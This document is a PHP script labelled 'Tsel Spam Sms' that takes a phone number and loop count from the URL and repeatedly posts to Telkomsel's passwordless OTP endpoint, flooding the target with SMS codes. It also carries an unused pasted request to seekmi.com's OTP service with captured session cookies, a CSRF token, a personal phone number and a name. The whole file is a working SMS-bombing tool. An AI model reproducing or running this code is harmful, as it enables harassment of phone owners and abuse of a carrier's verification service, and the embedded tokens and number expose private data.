<?php

/* 
Tsel Spam Sms
C0ded by : Muhammad Ikhsan f.t Achmad Rivaldi
Github  : https://github.com/thaniaanatasya
Admin Nabila Tools
*/
if(!$_GET['no']){ 
echo "Nabila Tools SMS https://my.telkomsel.com/";
}else{
$loop = $_GET['loop'];
$no = $_GET['no'];
            $header = array(
		    'POST /ajax/send-otp HTTP/1.1',
            'Host: seekmi.com',
            'User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0',
            'Accept: */*',
            'Accept-Language: en-US,en;q=0.5',
            'Accept-Encoding: gzip, deflate',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'X-CSRF-TOKEN: R6oje8mgZP968WfifwQDITsD7aulw88JF7YYgZL2',
            'X-Requested-With: XMLHttpRequest',
            'Referer: https://seekmi.com/register',
            'Content-Length: 39',
            'Cookie: XSRF-TOKEN=eyJpdiI6IkNTZkJoUm5URlVqTTE4b0dhR2FDY1E9PSIsInZhbHVlIjoiVStFaHZTR0wxRGlVNWFOdzd0TUMrR2o0cnJ6VWVyNGJCVDFCcUlpMGs5QW9vWDZIc3JReTRDQ1hBbFdkSHExd0V5Qzc1T2Q2alErZUs5bEhKU1VLT0E9PSIsIm1hYyI6ImVjZTcxYzAwZTE4MTZlNjNmYzUwNDA5Y2ViZmFiMDNjMmY0NTJjZTU3MGM3MjljYzU0YWQ1Y2ZjZDk2NWNhMjgifQ%3D%3D; laravel_session=eyJpdiI6InA2a1NzNnJWYVUwSCtQVzZrODh3b3c9PSIsInZhbHVlIjoieVI5UHRcL2pqNlNlSk02RWd2ZVlvTndJa0tmTGtpcUd0K2d3SHpSb3dWb0lhMGdtc2Yrc0ROWUtDemJKUnBaMDRPSWlicjdydkhsTDdUWW90dVwvd3JVQT09IiwibWFjIjoiMmQ5ZGI4MWY3YzlmYTkxNTk1OGVlZWI0YWEwNDI1NzVhNTYzYzliOTk1NzQ2N2ExZWViMzQ1NzJjMjVhMWMyMyJ9; pnctest=1; _ga=GA1.2.1959941686.1522653385; _gid=GA1.2.816348434.1522653385; _gali=register',
            'Connection: keep-alive',
            'Pragma: no-cache',
            'Cache-Control: no-cache',
            'phone=087714070299&name=Muhanmad+Ikhsan',
            'HTTP/1.1 200 OK',
            'Server: nginx/1.10.3 (Ubuntu)',
            'Content-Type: application/json',
            'Transfer-Encoding: chunked',
            'Connection: keep-alive',
            'Vary: Accept-Encoding',
            'Cache-Control: no-cache, private',
            'Date: Mon, 02 Apr 2018 07:19:00 GMT',
            'Set-Cookie: XSRF-TOKEN=eyJpdiI6IjhzWlorblwvbjNGcHF2YmczcEJiMllBPT0iLCJ2YWx1ZSI6IlFCWnN1bGtCUnZwUkNkSGpHZEh3cDFBQTZqMktKUDd6M09WdXRyYUd0b3pGQ1NhMnlNRFpTZG92S2VyVGFPN2RDSjQxYzZmS05SaVZPZEZmbEpTWEVBPT0iLCJtYWMiOiI4MzViZGJkYThmY2RmN2UzZTg1MDczMTFjYmE1NzM2MWI2MzBlMTdmNzUwZDAwZWZhYzljNTZkZmQ0YTM3OWJlIn0%3D; expires=Mon, 02-Apr-2018 09:19:00 GMT; Max-Age=7200; path=/; domain=.seekmi.com',
            'Set-Cookie: laravel_session=eyJpdiI6Ik9DVmtDZmJwYjBhUFRmdVFtdFVoWlE9PSIsInZhbHVlIjoiMmVGcm1nQ3hjZ2hBV2p5UWhRWCtTVGpTdER3WFJDeEFOWnd0M2xnWEpYK0hiNEppS1BVQStkYjQ2S1lzZmJ2Vnh6NWpyOGJDQUpzelwvXC9zTU83YkVQdz09IiwibWFjIjoiZDg1NDBhZjQxMmRmY2M3ZDEzZjczZWZiOWFkMGNhODE0N2U3MzY3YmE4OWQzZmNjMWMxMzk0Zjc4YTBlMTY5YSJ9; expires=Mon, 02-Apr-2018 09:19:00 GMT; Max-Age=7200; path=/; domain=.seekmi.com; HttpOnly',
            'Content-Encoding: gzip',);
    function http($postdata){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://tdwidm.telkomsel.com/passwordless/start');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_VERBOSE, false);
        if(!empty($postdata)){
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
        }
        $response = curl_exec($ch);
        $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        return array($http, $response);
    }
    for ($x = 3;$x <= $loop ;$x++) {
    http("phone_number=%2B".$no."&connection=sms"); 
    echo "Sms ke ".$no." Sukses<br>";
}
}

?>